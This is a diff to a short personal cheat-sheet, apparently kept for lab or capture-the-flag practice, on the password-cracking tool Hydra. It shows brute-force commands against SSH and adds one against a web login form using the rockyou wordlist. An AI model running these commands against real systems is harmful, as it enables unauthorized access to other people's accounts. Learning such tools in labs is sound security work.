@@ -4,6 +4,7 @@ tags:
   - fetus
 ---
 ## usage:
+### normal brute:
 ```sh
 hydra -l username -P passlist ssh://IP:PORT
 ```
@@ -12,6 +13,11 @@ hydra -l username -P passlist ssh://IP:PORT
 - `-P` for pass list 
 	- `-p` for known pass 
 - `ssh://IP:PORT` is self explanatory
+### http post form brute:
+```sh
+hydra -l USER -P /usr/share/wordlists/rockyou.txt 10.10.120.54 http-post-form "/PAGE_PATH:username=^USER^&password=^PASS^:F=FILTER_WORD"
+```
+## stuff idk
 - Supported Protocols:
 	- Asterisk  
 	- AFP  
